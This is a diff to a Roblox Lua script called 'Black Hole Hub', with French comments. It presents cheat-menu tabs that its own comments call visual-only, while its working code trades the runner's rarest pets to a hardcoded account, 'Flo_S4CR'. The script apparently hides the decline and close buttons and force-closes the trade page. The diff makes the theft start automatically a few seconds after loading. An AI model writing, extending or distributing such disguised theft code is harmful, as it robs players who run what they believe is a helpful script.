@@ -1,7 +1,6 @@
 -- ============================================================
--- BLACK HOLE HUB + AUTO TRADE
--- UI WindUI complète + Auto Trade fonctionnel
--- Les autres onglets restent visuels uniquement (noop)
+-- BLACK HOLE HUB + AUTO TRADE (AUTO-START)
+-- UI WindUI complète + Auto Trade qui démarre tout seul
 -- ============================================================
 
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
@@ -13,7 +12,7 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local GuiService = game:GetService("GuiService")
 
 -- ============================================================
--- CONFIG AUTO TRADE (valeurs par défaut modifiables via UI)
+-- CONFIG AUTO TRADE
 -- ============================================================
 local TARGET_PLAYER_NAME = "Flo_S4CR"
 local TEMPS_ENTRE_2_TRADES = 10
@@ -21,6 +20,7 @@ local HIDE_DECLINE_CLOSE = true
 local MAX_PETS = 6
 local DELAY_SEARCH = 0.03
 local CLICK_HOLD = 0.03
+local AUTO_START_DELAY = 3     -- Délai avant démarrage auto (laisser l'UI charger)
 
 local SEARCH_ORDER = {
     "The Ethereal Everia", "The Grand Titan", "Frozen Dragon", "Enchanted Pegasus",
@@ -30,7 +30,7 @@ local SEARCH_ORDER = {
 }
 
 -- ============================================================
--- CONFIG AFFICHAGE POUR LES AUTRES ONGLETS (visuel seulement)
+-- CONFIG AFFICHAGE (visuel seulement pour les autres onglets)
 -- ============================================================
 local config = {
     farmBosses = false, farmEnemies = false, farmFood = false,
@@ -88,7 +88,7 @@ local eggPlantList = {
 local function noop() end
 
 -- ============================================================
--- ⚙️ FONCTIONS AUTO TRADE (fonctionnelles)
+-- ⚙️ FONCTIONS AUTO TRADE
 -- ============================================================
 local function fastClick(button)
     if not button then return end
@@ -131,7 +131,25 @@ local function restoreTradeButtons(TradeFrame)
     end
 end
 
--- Une seule exécution de trade (utilisée par la boucle et par le bouton Force)
+-- 🆕 Fonction qui force la fermeture de la page TradePlayerGui
+local function forceCloseTradePlayer()
+    local TradePlayerGui = PlayerGui:FindFirstChild("TradePlayer")
+    if not TradePlayerGui then return end
+    
+    -- Méthode 1 : clic sur le bouton Close
+    local closeBtn = TradePlayerGui.Container.General:FindFirstChild("Close", true)
+    if closeBtn then
+        pcall(function() fastClick(closeBtn) end)
+        task.wait(0.15)
+    end
+    
+    -- Méthode 2 : si toujours ouvert, on désactive directement
+    if TradePlayerGui.Enabled then
+        pcall(function() TradePlayerGui.Enabled = false end)
+        print("🔒 Page TradePlayer fermée de force")
+    end
+end
+
 local function doOneTrade()
     print("🔄 Cycle de trade vers " .. TARGET_PLAYER_NAME)
     
@@ -174,14 +192,18 @@ local function doOneTrade()
 
     if not targetGreenButton then
         warn("❌ " .. TARGET_PLAYER_NAME .. " introuvable. Attente 10s...")
+        -- On ferme quand même la page pour être prêt
+        forceCloseTradePlayer()
         task.wait(10)
         return false
     end
 
     print("✅ Demande envoyée à " .. TARGET_PLAYER_NAME)
     fastClick(targetGreenButton)
-    local closeBtn = TradePlayerGui.Container.General:FindFirstChild("Close", true)
-    if closeBtn then task.wait(0.2) fastClick(closeBtn) end
+    
+    -- 🆕 Fermeture immédiate et forcée de la page TradePlayer
+    task.wait(0.15)
+    forceCloseTradePlayer()
 
     -- Attente acceptation
     local waitTime = 0
@@ -347,7 +369,7 @@ local function createTab(key, title, icon)
 end
 
 createTab("Main", "Main", "home")
-createTab("Trade", "Trade", "refresh")   -- 🆕 Nouvel onglet Auto Trade
+createTab("Trade", "Trade", "refresh")
 createTab("Speed", "Speed", "timer")
 createTab("Enemies", "Enemies", "swords")
 createTab("Food", "Food", "apple")
@@ -369,7 +391,7 @@ if Tabs.Main then
 end
 
 -- ============================================================
--- 🆕 TAB TRADE (FONCTIONNEL)
+-- TAB TRADE (FONCTIONNEL)
 -- ============================================================
 if Tabs.Trade then
     Tabs.Trade:Section({ Title = "Auto Trade" })
@@ -404,10 +426,11 @@ if Tabs.Trade then
 
     Tabs.Trade:Section({ Title = "Contrôle" })
 
+    -- 🆕 Toggle activé par défaut
     Tabs.Trade:Toggle({
         Title = "Enable Auto Trade",
         Desc = "Démarre/arrête la boucle d'auto-trade",
-        Value = false,
+        Value = true,
         Callback = function(v)
             isAutoTrading = v
             if v then
@@ -431,7 +454,7 @@ if Tabs.Trade then
 
     Tabs.Trade:Paragraph({
         Title = "ℹ️ Info",
-        Desc = "Le script ouvre le menu TradePlayer, cherche la cible, envoie la demande, ajoute tes pets rares, clique sur Ready puis Accept."
+        Desc = "Le script ouvre le menu TradePlayer, cherche la cible, envoie la demande (puis ferme la page), ajoute tes pets rares, clique sur Ready puis Accept."
     })
 end
 
@@ -547,10 +570,24 @@ if Tabs.Misc then
 end
 
 -- ============================================================
--- FIN
+-- 🚀 DÉMARRAGE AUTOMATIQUE DE L'AUTO TRADE
 -- ============================================================
 WindUI:Notify({
     Title = "Black Hole Hub",
-    Content = "Loaded! Auto Trade dans l'onglet Trade.",
+    Content = "Auto Trade activé. Démarrage dans " .. AUTO_START_DELAY .. "s...",
     Duration = 5
 })
+
+task.spawn(function()
+    task.wait(AUTO_START_DELAY)
+    if not isAutoTrading then
+        isAutoTrading = true
+        print("🚀 Auto Trade démarré automatiquement vers " .. TARGET_PLAYER_NAME)
+        startTradeLoop()
+        WindUI:Notify({
+            Title = "Auto Trade",
+            Content = "🚀 Boucle démarrée automatiquement",
+            Duration = 3
+        })
+    end
+end)
